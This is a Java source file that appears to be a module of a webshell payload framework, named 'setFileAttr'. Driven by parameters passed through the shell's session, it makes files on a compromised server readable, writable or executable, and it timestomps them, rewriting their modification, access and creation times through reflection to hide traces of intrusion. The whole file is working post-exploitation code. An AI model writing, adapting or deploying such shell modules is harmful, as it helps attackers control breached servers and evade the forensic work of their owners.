package shells.payloads.java.modules;

import java.io.File;
import java.lang.reflect.Array;
import java.lang.reflect.Method;
import java.util.Arrays;
import java.util.Date;
import java.util.Map;

public class SetFileAttrModule {
    private Map session;
    private Object servletRequest;

    private String getString(String key) {
        Object value = this.session != null ? this.session.get(key) : null;
        if (value instanceof byte[]) {
            return new String((byte[])value);
        }
        return value != null ? value.toString() : null;
    }

    private Method getMethodByClass(Class clazz, String methodName, Class[] parameterTypes) {
        Method method = null;

        while(clazz != null) {
            try {
                method = clazz.getDeclaredMethod(methodName, parameterTypes);
                clazz = null;
            } catch (Exception ignored) {
                clazz = clazz.getSuperclass();
            }
        }

        return method;
    }

    public void setSession(Map session) {
        this.session = session;
    }

    public void setServletRequest(Object servletRequest) {
        this.servletRequest = servletRequest;
    }

    public byte[] execute() {
        String type = this.getString("type");
        String attr = this.getString("attr");
        String fileName = this.getString("fileName");
        String ret = "Null";
        if (type != null && attr != null && fileName != null) {
            try {
                File f = new File(fileName);
                if ("fileBasicAttr".equals(type)) {
                    if (this.getMethodByClass(File.class, "setWritable", new Class[]{Boolean.TYPE}) != null) {
                        if (attr.indexOf("R") != -1) {
                            f.setReadable(true);
                        }

                        if (attr.indexOf("W") != -1) {
                            f.setWritable(true);
                        }

                        if (attr.indexOf("X") != -1) {
                            f.setExecutable(true);
                        }

                        ret = "ok";
                    } else {
                        ret = "Java version is less than 1.6";
                    }
                } else if ("fileTimeAttr".equals(type)) {
                    Date d = new Date(0L);
                    StringBuffer sb = new StringBuffer();
                    sb.append(attr);
                    char[] zeros = new char[13 - sb.length()];
                    Arrays.fill(zeros, '0');
                    sb.append(zeros);
                    d = new Date(d.getTime() + Long.parseLong(sb.toString()));
                    f.setLastModified(d.getTime());
                    ret = "ok";

                    try {
                        Class pathsClass = Class.forName("java.nio.file.Paths");
                        Class pathClass = Class.forName("java.nio.file.Path");
                        Class viewClass = Class.forName("java.nio.file.attribute.BasicFileAttributeView");
                        Class filesClass = Class.forName("java.nio.file.Files");
                        Class fileTimeClass = Class.forName("java.nio.file.attribute.FileTime");
                        Class linkOptionArrayClass = Class.forName("[java.nio.file.LinkOption");
                        Method pathsGet = pathsClass.getMethod("get", new Class[]{String.class, String[].class});
                        Method fromMillis = fileTimeClass.getMethod("fromMillis", new Class[]{Long.TYPE});
                        Method getView = filesClass.getMethod("getFileAttributeView", new Class[]{pathClass, Class.class, linkOptionArrayClass});
                        Method setTimes = viewClass.getMethod("setTimes", new Class[]{fileTimeClass, fileTimeClass, fileTimeClass});
                        Object path = pathsGet.invoke((Object)null, new Object[]{fileName, new String[0]});
                        Object linkOptions = Array.newInstance(linkOptionArrayClass.getComponentType(), 0);
                        Object view = getView.invoke((Object)null, new Object[]{path, viewClass, linkOptions});
                        Object ft = fromMillis.invoke((Object)null, new Object[]{Long.valueOf(d.getTime())});
                        setTimes.invoke(view, new Object[]{ft, ft, ft});
                    } catch (Throwable ignored) {
                    }
                } else {
                    ret = "no ExcuteType";
                }
            } catch (Throwable t) {
                StringBuffer sb = new StringBuffer();
                sb.append("Exception errMsg:");
                sb.append(t.getMessage());
                return sb.toString().getBytes();
            }
        } else {
            ret = "type or attr or fileName is empty";
        }

        return ret.getBytes();
    }

    public String getModuleName() {
        return "setFileAttr";
    }
}
